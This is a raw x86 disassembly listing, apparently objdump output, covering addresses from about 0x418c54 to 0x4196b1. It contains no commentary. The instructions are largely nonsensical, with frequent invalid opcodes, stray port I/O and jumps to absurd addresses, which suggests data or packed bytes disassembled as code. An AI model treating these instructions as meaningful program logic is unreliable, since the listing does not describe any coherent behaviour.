  418c54:	add    BYTE PTR [ebx-0x79],ah
  418c57:	xchg   ebx,eax
  418c58:	jb     0x418cc5
  418c5a:	js     0x418c1f
  418c5c:	iret   
  418c5d:	jbe    0x418cdd
  418c5f:	ret    
  418c60:	sbb    eax,DWORD PTR ds:0x36c0580
  418c66:	push   ss
  418c67:	repz inc esp
  418c69:	inc    esp
  418c6a:	cmp    al,0x95
  418c6c:	lea    ecx,[esi-0x273c77fc]
  418c72:	(bad)  
  418c73:	mov    ch,0x4f
  418c75:	and    BYTE PTR [ebx-0x68b8d71c],0x92
  418c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c7d:	in     eax,dx
  418c7e:	shl    al,0xc7
  418c81:	scas   al,BYTE PTR es:[edi]
  418c82:	xor    eax,0x448cb325
  418c87:	js     0x418c97
  418c89:	cmp    al,0x91
  418c8b:	loope  0x418c46
  418c8d:	loop   0x418c30
  418c8f:	enter  0xb6,0x0
	...
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shl    BYTE PTR [eax],cl
  418d01:	xchg   edx,eax
  418d02:	mov    ah,0xa0
  418d04:	loopne 0x418d0c
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0xe8000001
  418d0d:	jmp    0x418d8c
  418d0f:	push   0x83944526
  418d14:	ss aaa 
  418d16:	cmp    al,0x37
  418d18:	xchg   ebx,eax
  418d19:	pushf  
  418d1a:	out    dx,al
  418d1b:	inc    edx
  418d1c:	add    al,0x83
  418d1e:	pushf  
  418d1f:	scas   eax,DWORD PTR es:[edi]
  418d20:	icebp  
  418d21:	jg     0x418d1f
  418d23:	(bad)  [ecx]
  418d25:	(bad)  
  418d26:	std    
  418d27:	jns    0x418cfd
  418d29:	(bad)
  418d2c:	and    BYTE PTR [ebx-0x1ca570c4],bl
  418d32:	pmaxsw mm5,QWORD PTR [esi+edi*1-0x7b]
  418d37:	es ss and edx,ebx
  418d3b:	fisub  DWORD PTR [eax+edi*4]
  418d3e:	add    al,0x55
  418d41:	cmp    eax,0x69e114a5
  418d46:	(bad)  
  418d47:	mov    ch,0xa2
  418d49:	jle    0x418cf3
  418d4b:	push   edx
  418d4c:	out    dx,eax
  418d4d:	outs   dx,BYTE PTR ds:[esi]
  418d4e:	pop    edx
  418d4f:	in     eax,0x86
  418d51:	adc    BYTE PTR [esi+0x2a],dl
  418d54:	push   edx
  418d55:	cmp    BYTE PTR [edx-0x573d7c29],bl
  418d5b:	xchg   ebp,eax
  418d5c:	enter  0x2e9d,0x75
  418d60:	push   edi
  418d61:	loopne 0x418dae
  418d63:	bswap  esp
  418d65:	jge    0x418d4b
  418d67:	out    0x4d,al
  418d69:	dec    ebp
  418d6a:	test   al,0x6d
  418d6c:	(bad)  
  418d6d:	call   0x429df974
  418d72:	push   es
  418d73:	ins    BYTE PTR es:[edi],dx
  418d74:	jmp    0x418dec
  418d76:	ss inc esp
  418d78:	out    0x2e,al
  418d7a:	(bad)  [ebp+0x227a3645]
  418d80:	inc    edi
  418d81:	fist   WORD PTR [ebp+0x3a]
  418d84:	ucomiss xmm5,DWORD PTR [ebp-0x55b8dc79]
  418d8b:	in     al,dx
  418d8c:	stos   BYTE PTR es:[edi],al
  418d8d:	loop   0x418d92
  418d8f:	ret    
  418d90:	adc    ch,BYTE PTR [eax-0x1f859514]
  418d96:	add    ch,BYTE PTR [edi]
  418d98:	imul   eax,ecx,0xda423975
  418d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d9f:	adc    eax,0x31c7baaa
  418da4:	or     DWORD PTR [ecx-0x3],ebp
  418da7:	dec    edx
  418da8:	pushf  
  418da9:	mov    edx,0x5b84263a
  418dae:	fwait
  418daf:	outs   dx,BYTE PTR ds:[esi]
  418db0:	push   edi
  418db1:	and    al,0xa
  418db3:	mov    cl,0x63
  418db5:	jmp    0xbc00baad
  418dba:	loope  0x418d86
  418dbc:	add    eax,0x4c54b475
  418dc1:	scas   eax,DWORD PTR es:[edi]
  418dc2:	in     al,dx
  418dc3:	cli    
  418dc4:	inc    ebp
  418dc5:	(bad)  
  418dc6:	xlat   BYTE PTR ds:[ebx]
  418dc7:	les    ebp,FWORD PTR [eax]
  418dc9:	iret   
  418dca:	add    esi,edx
  418dcc:	clc    
  418dcd:	push   edx
  418dce:	dec    edi
  418dcf:	fs repz std 
  418dd2:	mov    ch,0xf7
  418dd4:	xor    esi,DWORD PTR [edi]
  418dd6:	mov    edi,0x50b33c42
  418ddb:	fsincos 
  418ddd:	xor    edx,DWORD PTR [edx+0x16]
  418de0:	mov    ebx,0xfb8f2bfd
  418de5:	push   ds
  418de6:	in     al,0x20
  418de8:	sub    BYTE PTR [ebx-0x36],ah
  418deb:	inc    eax
  418dec:	rcr    DWORD PTR [eax],cl
  418dee:	sbb    DWORD PTR [ebp-0x31a6761b],edx
  418df4:	test   al,0x85
  418df6:	(bad)  
  418df7:	stc    
  418df8:	jmp    DWORD PTR [esi]
  418dfa:	cld    
  418dfb:	xchg   ebx,eax
  418dfc:	imul   edi,DWORD PTR [eax],0xcb17d616
  418e02:	xlat   BYTE PTR ds:[ebx]
  418e03:	mov    dh,0x51
  418e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e06:	mov    al,ds:0x5a1447ea
  418e0b:	add    BYTE PTR [edx],bh
  418e0d:	push   DWORD PTR [eax+ebx*4+0x42]
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x4d]
  418e81:	dec    BYTE PTR [esi+edx*1]
  418e84:	in     eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0xc9000001
  418e8d:	or     eax,0xd217dad7
  418e92:	xor    DWORD PTR [edi-0x7f],edi
  418e95:	scas   eax,DWORD PTR es:[edi]
  418e96:	push   esi
  418e97:	scas   al,BYTE PTR es:[edi]
  418e98:	fcom   QWORD PTR [edi]
  418e9a:	out    0x79,eax
  418e9c:	lods   al,BYTE PTR ds:[esi]
  418e9d:	addr16 sbb eax,0xb99156e2
  418ea3:	inc    edx
  418ea4:	push   edx
  418ea5:	push   edx
  418ea6:	mov    al,0xbb
  418ea8:	mov    BYTE PTR [edx+0x39],ah
  418eab:	(bad)  
  418ead:	lea    edi,ds:0x8a8f0d74
  418eb3:	icebp  
  418eb4:	jg     0x418eb8
  418eb6:	(bad)  
  418eb7:	dec    eax
  418eb8:	jl     0x418e79
  418eba:	call   0x1c56fc78
  418ebf:	pop    edi
  418ec0:	int    0xca
  418ec2:	js     0x418e61
  418ec4:	dec    eax
  418ec5:	stos   DWORD PTR es:[edi],eax
  418ec6:	sub    al,0xb1
  418ec8:	push   edx
  418ec9:	inc    edi
  418eca:	cdq    
  418ecb:	cmp    ah,BYTE PTR [edx+ecx*2]
  418ece:	in     al,dx
  418ecf:	xchg   edx,eax
  418ed0:	add    ebx,DWORD PTR [edx]
  418ed2:	push   edx
  418ed3:	sar    BYTE PTR [ebx+0xf],1
  418ed6:	inc    edi
  418ed7:	xchg   esp,eax
  418ed8:	and    edx,DWORD PTR [eax]
  418eda:	and    eax,DWORD PTR [eax-0x46]
  418edd:	push   ss
  418ede:	(bad)  
  418edf:	stc    
  418ee0:	sbb    BYTE PTR [esi-0x2a93aa60],cl
  418ee6:	stos   BYTE PTR es:[edi],al
  418ee7:	pop    ds
  418ee8:	mov    ebx,0xd91c1a7c
  418eed:	pop    ds
  418eee:	leave  
  418eef:	scas   al,BYTE PTR es:[edi]
  418ef0:	xor    cl,dh
  418ef2:	cli    
  418ef3:	xchg   ebx,eax
  418ef4:	call   FWORD PTR [esi-0x51d95ca3]
  418efa:	sbb    DWORD PTR [ebp+0x4],0x10
  418efe:	(bad)  
  418eff:	xchg   edx,eax
  418f00:	(bad)  
  418f01:	jmp    0x1b65:0xc34d2f50
  418f08:	fisubr DWORD PTR [eax]
  418f0a:	adc    al,ch
  418f0c:	sbb    al,0x15
  418f0e:	push   ebx
  418f0f:	inc    dl
  418f11:	push   esi
  418f12:	in     eax,0x30
  418f14:	les    ebp,FWORD PTR [ebx+0x1e]
  418f17:	xor    DWORD PTR [ebx-0x456ea53f],edx
  418f1d:	push   esp
  418f1e:	test   al,0x21
  418f20:	outs   dx,DWORD PTR ds:[esi]
  418f21:	pusha  
  418f22:	adc    DWORD PTR [ebp+0x1f],esp
  418f25:	fs je  0x418ee3
  418f28:	and    BYTE PTR [edi],dl
  418f2a:	push   0xd69d8092
  418f2f:	fwait
  418f30:	pop    esp
  418f31:	leave  
  418f32:	lock pushf 
  418f34:	fsub   QWORD PTR es:[eax+0x4c]
  418f38:	xchg   esi,eax
  418f39:	pop    ebp
  418f3a:	sbb    BYTE PTR [ebx],ch
  418f3c:	in     eax,dx
  418f3d:	xor    BYTE PTR [edi],dl
  418f3f:	cmp    DWORD PTR [ecx-0x21a93f10],ebp
  418f45:	push   ebx
  418f46:	daa    
  418f47:	pop    eax
  418f48:	test   eax,0xaaf85099
  418f4d:	nop
  418f4e:	and    al,0x87
  418f50:	add    BYTE PTR [esi],ah
  418f52:	retf   0x3e77
  418f55:	js     0x418eec
  418f57:	push   ds
  418f58:	sub    eax,0x6739d3c6
  418f5d:	push   es
  418f5e:	bound  edi,QWORD PTR [eax-0x6f0352c2]
  418f64:	push   edi
  418f65:	mov    ds:0xc04eadde,al
  418f6a:	fs mov bl,0xfd
  418f6d:	dec    esp
  418f6e:	and    eax,DWORD PTR [ebx-0x9]
  418f71:	xor    BYTE PTR [ecx+0x319c4a72],bh
  418f77:	inc    esp
  418f78:	add    al,0xab
  418f7a:	sub    al,0x6e
  418f7c:	mul    edx
  418f7e:	dec    esi
  418f7f:	xor    ecx,ebx
  418f81:	mov    al,0x1a
  418f83:	sub    al,0xbc
  418f85:	pop    ecx
  418f86:	xor    al,0xb5
  418f88:	xchg   edi,eax
  418f89:	adc    edi,edi
  418f8b:	jbe    0x418fb7
  418f8d:	jne    0x418f4e
  418f8f:	pop    edi
  418f90:	cwde   
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x51150e59]
  419001:	adc    DWORD PTR [ecx+eiz*4],ebx
  419004:	jmp    0x1:0x5000108
  41900b:	add    BYTE PTR [edx+0x3e4d9552],ch
  419011:	adc    ebx,DWORD PTR [eax+0x2c]
  419014:	stos   DWORD PTR es:[edi],eax
  419015:	or     edi,esp
  419017:	mov    ds:0x5cdaa52d,eax
  41901c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41901d:	(bad)  
  41901e:	mov    al,ds:0x41e3838a
  419023:	out    dx,al
  419024:	or     BYTE PTR [ecx+0x4c7859d1],0xf0
  41902b:	(bad)  
  41902c:	popa   
  41902d:	or     esp,0x2d
  419030:	popf   
  419031:	cmp    al,0xc4
  419033:	in     eax,0x49
  419035:	mov    eax,0x267d67b7
  41903a:	and    al,0x11
  41903c:	dec    esi
  41903d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41903e:	pushf  
  41903f:	out    0xbd,al
  419041:	out    0xce,al
  419043:	cmc    
  419044:	cmp    BYTE PTR [esi-0x2e],bh
  419047:	sahf   
  419048:	sbb    eax,0x334d93a4
  41904d:	inc    esp
  41904e:	push   esi
  41904f:	sub    al,0xb6
  419051:	gs jb  0x41906d
  419054:	mov    ebp,0xe4c02ce7
  419059:	in     eax,dx
  41905a:	jmp    FWORD PTR [ebx]
  41905c:	xor    al,0x74
  41905e:	mov    al,ds:0x1fa71d29
  419063:	sbb    ah,BYTE PTR [ebx+ebx*4]
  419066:	in     eax,0x5d
  419068:	xor    al,0x30
  41906a:	clc    
  41906b:	idiv   BYTE PTR [ebx+0x17]
  41906e:	or     al,BYTE PTR [eax+ebx*8]
  419071:	adc    al,0x14
  419073:	push   eax
  419074:	push   eax
  419075:	retf   
  419076:	mov    BYTE PTR [esi+0x64a72930],bh
  41907c:	fidivr DWORD PTR [ebp+0x31a15c9c]
  419082:	mov    esp,0xb0674b6b
  419087:	lds    ecx,FWORD PTR [esi-0x7b]
  41908a:	xor    eax,0x1cdec3f
  41908f:	mov    dh,0xd9
  419091:	mov    BYTE PTR fs:[ecx+0x5a],cl
  419095:	stc    
  419096:	dec    ebx
  419097:	in     eax,dx
  419098:	xchg   esi,eax
  419099:	pop    ss
  41909a:	mov    eax,ds:0x45440f1f
  41909f:	cmp    BYTE PTR [ebx],bh
  4190a1:	inc    eax
  4190a2:	or     dh,BYTE PTR [esi]
  4190a4:	(bad)  
  4190a5:	std    
  4190a6:	imul   ecx,DWORD PTR [esi],0x25e75956
  4190ac:	adc    BYTE PTR [edx],ch
  4190ae:	add    ecx,DWORD PTR [edi+0x7c509db8]
  4190b4:	add    al,0x3b
  4190b6:	int3   
  4190b7:	mov    cl,0x37
  4190b9:	jg     0x4190ff
  4190bb:	ret    0x1458
  4190be:	out    0x63,al
  4190c0:	(bad)  
  4190c1:	or     bh,BYTE PTR [esp+ebx*2+0xa]
  4190c5:	in     al,0x5f
  4190c7:	fnstenv [edi+ebp*8+0x267e4a69]
  4190ce:	lods   al,BYTE PTR ds:[esi]
  4190cf:	dec    esp
  4190d0:	shl    BYTE PTR ds:0x9023da7e,0xc8
  4190d7:	xchg   BYTE PTR [ebp+0x7d],ah
  4190da:	shr    BYTE PTR [ecx+0x353b28ef],1
  4190e0:	scas   al,BYTE PTR es:[edi]
  4190e1:	pop    edi
  4190e2:	aam    0xa6
  4190e4:	sub    al,0x54
  4190e6:	push   edx
  4190e7:	nop
  4190e8:	xchg   edi,eax
  4190e9:	sbb    dh,BYTE PTR fs:[esi-0x63]
  4190ed:	adc    BYTE PTR [ebx+eax*1],dh
  4190f0:	adc    DWORD PTR [edi],0xbd093b3b
  4190f6:	fwait
  4190f7:	imul   edx,DWORD PTR [ebx],0x10d82ade
  4190fd:	jp     0x4190a2
  4190ff:	lahf   
  419100:	xchg   edx,eax
  419101:	xchg   ebx,eax
  419102:	fidiv  WORD PTR [esi+0x5d523495]
  419108:	(bad)  
  41910a:	dec    edi
  41910b:	add    esp,DWORD PTR [esi]
  41910d:	jne    0x4190af
  41910f:	shl    ebp,0x0
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ch,BYTE PTR ds:0xef167adb
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x68000001,al
  41918d:	sbb    dl,ch
  41918f:	jmp    0x852cf841
  419194:	aaa    
  419195:	and    BYTE PTR [eax],al
  419197:	dec    esi
  419198:	or     al,0xaf
  41919a:	jo     0x41915f
  41919c:	jmp    0x5adc3a90
  4191a1:	push   es
  4191a2:	nop
  4191a3:	cmp    BYTE PTR [ecx-0x2768c956],0xe5
  4191aa:	jb     0x4191ee
  4191ac:	push   ss
  4191ad:	xor    DWORD PTR [edi-0x5f3be65e],0xfac96e4a
  4191b7:	lahf   
  4191b8:	and    bl,ch
  4191ba:	inc    ebp
  4191bb:	test   BYTE PTR [esi],dh
  4191bd:	add    al,0x57
  4191bf:	inc    esi
  4191c0:	inc    ecx
  4191c1:	jbe    0x419168
  4191c3:	adc    al,0x8
  4191c5:	mov    bl,0xe2
  4191c7:	lea    ebx,[esi+0x40]
  4191ca:	int3   
  4191cb:	dec    eax
  4191cc:	pop    esp
  4191cd:	xchg   BYTE PTR [eax+0x1f],al
  4191d0:	jne    0x419175
  4191d2:	mov    eax,0xd4580fa5
  4191d7:	int    0x20
  4191d9:	test   al,0x76
  4191db:	aaa    
  4191dc:	stc    
  4191dd:	push   edx
  4191de:	in     al,0xd7
  4191e0:	lods   eax,DWORD PTR ds:[esi]
  4191e1:	and    al,0x38
  4191e3:	mov    ch,0xb4
  4191e5:	mov    ch,0xe0
  4191e7:	pop    eax
  4191e8:	cmp    BYTE PTR [eax],cl
  4191ea:	and    DWORD PTR [ebx+0x51191772],esi
  4191f0:	pop    ss
  4191f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f2:	icebp  
  4191f3:	xchg   esp,eax
  4191f4:	or     BYTE PTR [esi+0x7a],cl
  4191f7:	pop    ds
  4191f8:	mov    ch,0x62
  4191fa:	mov    ds:0x481c0c4b,eax
  4191ff:	inc    edx
  419200:	lds    eax,FWORD PTR [edi]
  419202:	ret    0x3a23
  419205:	pop    eax
  419206:	cmp    dh,BYTE PTR [ecx]
  419208:	jmp    0x4191e5
  41920a:	push   0xffffffbe
  41920c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41920d:	fmul   QWORD PTR [edx-0x7cf30778]
  419213:	pop    ebx
  419214:	jo     0x4191d8
  419216:	inc    esi
  419217:	sahf   
  419218:	pop    esp
  419219:	add    BYTE PTR [ebp-0xd],0xb4
  41921d:	popa   
  41921e:	pop    esi
  41921f:	lahf   
  419220:	or     eax,0x541fee3b
  419225:	add    dl,ah
  419227:	dec    edx
  419228:	inc    ecx
  419229:	ret    0x34ac
  41922c:	test   al,0x64
  41922e:	out    0x95,al
  419230:	mov    edx,0x10528108
  419235:	add    eax,0x80176f47
  41923a:	jmp    0x4687:0xbd0b0b6
  419241:	or     al,0x45
  419243:	mov    ebp,0x62f4efe4
  419248:	or     esp,0xc151e
  41924e:	mov    esi,0xe27bdb3b
  419253:	sub    ebx,DWORD PTR [esi+edi*2+0x3a46acd]
  41925a:	fstp   TBYTE PTR [edi]
  41925c:	(bad)  
  41925d:	aas    
  41925e:	into   
  41925f:	fndisi(8087 only) 
  419261:	sahf   
  419262:	mov    ecx,0x627cfa68
  419267:	sub    al,0x4c
  419269:	dec    ebp
  41926a:	push   eax
  41926b:	nop
  41926c:	ins    DWORD PTR es:[edi],dx
  41926d:	aad    0x5
  41926f:	mov    ds:0xeeeb6f1a,eax
  419274:	sub    DWORD PTR [edi-0x18],esi
  419277:	jmp    0x41927c
  419279:	and    al,0x98
  41927b:	dec    edx
  41927c:	mov    ds:0x3df65d08,eax
  419281:	xchg   esp,eax
  419282:	xor    BYTE PTR [ecx-0x73],0xdd
  419286:	jl     0x41924a
  419288:	(bad)  
  41928b:	enter  0x58c4,0xc2
  41928f:	xchg   esi,eax
  419290:	aas    
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	gs pop ebx
  419302:	loopne 0x419329
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0x1e000001,al
  41930d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41930e:	pusha  
  41930f:	pop    eax
  419310:	outs   dx,DWORD PTR ds:[esi]
  419311:	adc    eax,0x1fcdae01
  419316:	(bad)  
  419317:	test   dh,al
  419319:	imul   ebp,ebx,0xdbb679de
  41931f:	cdq    
  419320:	inc    edi
  419321:	add    esi,DWORD PTR [ecx]
  419323:	add    dh,bh
  419325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419326:	sar    BYTE PTR [edx+0x5c],0xd4
  41932a:	(bad)  
  41932b:	and    edx,DWORD PTR [ebx]
  41932d:	fsubp  st(1),st
  41932f:	into   
  419330:	fist   DWORD PTR [esi+0x275074fa]
  419336:	jmp    0x7eb7:0x50520de0
  41933d:	mov    es,WORD PTR [ecx+0x47]
  419340:	imul   esi,DWORD PTR [ebp-0x6a844694],0x4f61eda
  41934a:	inc    edx
  41934b:	bound  eax,QWORD PTR [edi+0x64]
  41934e:	(bad)  
  41934f:	adc    BYTE PTR [edi],al
  419351:	push   ss
  419352:	add    dh,BYTE PTR [eax+esi*4-0x6b]
  419356:	or     al,0x43
  419358:	inc    eax
  419359:	lahf   
  41935a:	jnp    0x4193b6
  41935c:	scas   al,BYTE PTR es:[edi]
  41935d:	outs   dx,DWORD PTR ds:[esi]
  41935e:	mov    ds:0xb04f9e6a,al
  419363:	les    esi,FWORD PTR [ebx+0x45]
  419366:	cmc    
  419367:	call   0x94ca:0x204b9d0a
  41936e:	jns    0x419367
  419370:	test   al,0x26
  419372:	es or  al,0x3e
  419375:	fcmovnb st,st(0)
  419377:	leave  
  419378:	cli    
  419379:	adc    BYTE PTR [ecx+0x176b17f9],0x20
  419380:	sbb    eax,0x41309d79
  419385:	jmp    0x4193ae
  419387:	out    0x6,al
  419389:	mov    esp,0x67ec166
  41938e:	jp     0x419336
  419390:	sbb    BYTE PTR [edi+0xba3bbdf],dh
  419396:	jne    0x419323
  419398:	adc    ecx,eax
  41939a:	jnp    0x41938b
  41939c:	dec    edi
  41939d:	xchg   ebx,eax
  41939e:	xor    DWORD PTR [eax+0x46b81775],ecx
  4193a4:	call   0xf0d95168
  4193a9:	shl    edx,1
  4193ab:	or     BYTE PTR [edx+0x67ae008f],ah
  4193b1:	call   0x16ae:0x9fa1235e
  4193b8:	pop    edx
  4193b9:	dec    ecx
  4193ba:	adc    DWORD PTR [ebp-0x2e77d65d],eax
  4193c0:	and    bh,BYTE PTR [eax-0x64]
  4193c3:	adc    ecx,esp
  4193c5:	push   edx
  4193c6:	xchg   ebx,eax
  4193c7:	iret   
  4193c8:	inc    esi
  4193c9:	jb     0x41937c
  4193cb:	pop    ebx
  4193cc:	test   al,0x30
  4193ce:	push   cs
  4193cf:	mov    bl,0x8c
  4193d1:	fistp  DWORD PTR [edx-0x55485c5e]
  4193d7:	in     eax,0x72
  4193d9:	cmp    eax,0x4d
  4193dc:	out    0x21,al
  4193de:	mov    bh,0xe7
  4193e0:	or     cl,BYTE PTR [ecx]
  4193e2:	sbb    eax,0xba37e1b4
  4193e7:	ja     0x4193fa
  4193e9:	xlat   BYTE PTR ds:[ebx]
  4193ea:	pop    ebx
  4193eb:	call   0x911b8cbd
  4193f0:	jns    0x4193b7
  4193f2:	jne    0x41938c
  4193f4:	mov    eax,DWORD PTR [edi+eiz*1+0x4a]
  4193f8:	cmp    al,0xdd
  4193fa:	icebp  
  4193fb:	pop    esi
  4193fc:	fdivr  st,st(5)
  4193fe:	mov    dh,0xc2
  419400:	mov    DWORD PTR [eax],esi
  419402:	xor    eax,ebp
  419404:	jg     0x41944a
  419406:	call   0xa5e11822
  41940b:	add    eax,DWORD PTR [eax+0xc]
  41940e:	rcl    DWORD PTR [edx+0x63],0x0
	...
  419472:	add    BYTE PTR [eax],al
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	lock lock clc 
  419483:	sar    cl,cl
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0x88000001,al
  41948d:	(bad)  
  41948f:	add    esp,esi
  419491:	inc    ebx
  419492:	adc    BYTE PTR [ebp-0x1f],0xda
  419496:	sbb    dh,ah
  419498:	pop    ss
  419499:	pop    ds
  41949a:	push   cs
  41949b:	adc    al,0x14
  41949d:	mov    eax,0x9bfcb6fa
  4194a2:	xchg   edx,eax
  4194a3:	mov    edx,0x665d4c42
  4194a8:	and    BYTE PTR ds:[eax+0x5d2fbcc1],bh
  4194af:	mov    ch,0x7
  4194b1:	dec    eax
  4194b2:	lea    esi,[edi-0x1f]
  4194b5:	mov    eax,ds:0x4c45c0e6
  4194ba:	adc    al,0x62
  4194bc:	ror    DWORD PTR [ebx-0x80],1
  4194bf:	xchg   edx,eax
  4194c0:	rol    BYTE PTR [esi+0x28],cl
  4194c3:	cmp    DWORD PTR [ebx],ebx
  4194c5:	not    edx
  4194c7:	daa    
  4194c8:	sub    al,0x9b
  4194ca:	mov    ah,BYTE PTR ds:0x40821e25
  4194d0:	test   eax,0x308252ec
  4194d5:	add    eax,0x7d775188
  4194da:	gs fs push 0xb5c12b94
  4194e1:	xor    dl,BYTE PTR [edi+0x4a]
  4194e4:	lods   eax,DWORD PTR ds:[esi]
  4194e5:	sbb    eax,0x6be3533e
  4194ea:	cmp    edx,DWORD PTR [ebx-0x41778e89]
  4194f0:	jbe    0x4194c6
  4194f2:	mov    bl,0x8d
  4194f4:	add    eax,0x2f5ba6e4
  4194f9:	out    dx,eax
  4194fa:	jmp    0xfebb:0xc433011e
  419501:	and    ecx,ebp
  419503:	push   0xffffffa5
  419505:	jg     0x41950d
  419507:	js     0x419515
  419509:	mov    edx,DWORD PTR [ebx+0x19]
  41950c:	mov    ds:0xca1e7730,eax
  419511:	push   ss
  419512:	mov    al,ds:0xc3a8c648
  419517:	and    al,BYTE PTR ds:[ecx-0x48604d50]
  41951e:	daa    
  41951f:	inc    edi
  419520:	stc    
  419521:	push   0xffffffde
  419523:	xor    eax,ebp
  419525:	mov    edx,0x4af74bd3
  41952a:	pop    es
  41952b:	retf   0x535c
  41952e:	jecxz  0x419525
  419530:	push   ds
  419531:	sbb    dh,BYTE PTR [edx-0x37bba7e4]
  419537:	xchg   esp,eax
  419538:	ja     0x41958f
  41953a:	pusha  
  41953b:	int3   
  41953c:	pop    ds
  41953d:	sti    
  41953e:	cmp    eax,0xd3ac5fc6
  419543:	push   ss
  419544:	jle    0x4194d7
  419546:	cwde   
  419547:	(bad)  
  419548:	mov    ah,0x77
  41954a:	or     eax,0x3defb6de
  41954f:	(bad)  [esi]
  419551:	cwde   
  419552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419554:	cmp    BYTE PTR [esi],al
  419556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419557:	scas   al,BYTE PTR es:[edi]
  419558:	and    al,0x10
  41955a:	cmp    cl,0xeb
  41955d:	es out 0x51,eax
  419560:	dec    esi
  419561:	in     eax,0xfa
  419563:	and    ebp,DWORD PTR [esi]
  419565:	loop   0x4195e4
  419567:	stos   DWORD PTR es:[edi],eax
  419568:	imul   edi,DWORD PTR [edx],0xd0a17a76
  41956e:	xor    bl,BYTE PTR [ebx+0x55a0660c]
  419574:	outs   dx,DWORD PTR ds:[esi]
  419575:	cld    
  419576:	call   0x3231eae8
  41957b:	sub    ebp,ebx
  41957d:	mov    eax,ds:0xfa0644c3
  419582:	jecxz  0x41956d
  419584:	cld    
  419585:	xchg   edx,eax
  419586:	push   edx
  419587:	mov    bl,0x41
  419589:	shr    BYTE PTR [edi-0x54ab0703],1
  41958f:	dec    edx
  419590:	repnz add BYTE PTR [eax],al
	...
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	clc    
  419601:	xchg   BYTE PTR [eax],al
  419603:	dec    BYTE PTR [si]
  419606:	add    DWORD PTR [eax],eax
  419608:	add    eax,0xd8000001
  41960d:	retf   
  41960e:	mov    edx,0x78cd1ddc
  419613:	jecxz  0x41961b
  419615:	pop    esi
  419616:	adc    BYTE PTR [ebx-0x35],al
  419619:	push   0xafccc0ad
  41961e:	inc    esp
  41961f:	cmc    
  419620:	push   ebp
  419621:	lods   eax,DWORD PTR ds:[esi]
  419622:	dec    ebp
  419623:	mov    edx,0xde408451
  419628:	sbb    al,BYTE PTR [eax]
  41962a:	fist   DWORD PTR [ebx]
  41962c:	fsub   DWORD PTR [esi-0x10]
  41962f:	outs   dx,BYTE PTR ds:[esi]
  419630:	sbb    eax,0xd20d213c
  419635:	popf   
  419636:	(bad)  
  419637:	mov    al,0x9
  419639:	mov    esp,0xed4182d3
  41963e:	fwait
  41963f:	clc    
  419640:	inc    ebx
  419641:	in     al,0x49
  419643:	mov    al,ds:0x58b382fc
  419648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419649:	fs jne 0x41963a
  41964c:	ins    BYTE PTR es:[edi],dx
  41964d:	xchg   BYTE PTR [ebx+0x7b],cl
  419650:	jge    0x419696
  419652:	fsubr  DWORD PTR [esp+edi*1+0x3858fa1d]
  419659:	retf   
  41965a:	out    dx,al
  41965b:	out    dx,eax
  41965c:	xchg   edx,eax
  41965d:	sbb    cl,cl
  41965f:	mov    ecx,0xd62a5204
  419664:	(bad)  
  419665:	inc    BYTE PTR [edi+0x35182c08]
  41966b:	inc    edi
  41966c:	inc    esi
  41966d:	mov    ds:0x91f00a87,al
  419672:	sbb    dh,BYTE PTR [esp+esi*1+0x5210d4ad]
  419679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41967a:	bound  ebx,QWORD PTR [ebx+0x1]
  41967d:	sar    DWORD PTR [esi-0x693ea33f],cl
  419683:	or     DWORD PTR [edx+0x2],ecx
  419686:	or     eax,0xbbb49b9d
  41968b:	lahf   
  41968c:	sbb    bl,BYTE PTR [edi]
  41968e:	mov    ecx,0x5acb0122
  419693:	popa   
  419694:	int    0x5a
  419696:	mov    ds:0x77d9c2e3,al
  41969b:	push   0xa272c671
  4196a0:	and    esi,DWORD PTR [ebx+0x66]
  4196a3:	push   cs
  4196a4:	(bad)  
  4196a5:	dec    esp
  4196a6:	mov    ds:0x7e023323,al
  4196ab:	sti    
  4196ac:	rcr    DWORD PTR [ecx],1
  4196ae:	in     eax,dx
  4196af:	retf   
  4196b0:	inc    esp
  4196b1:	mov    dh,0xbe
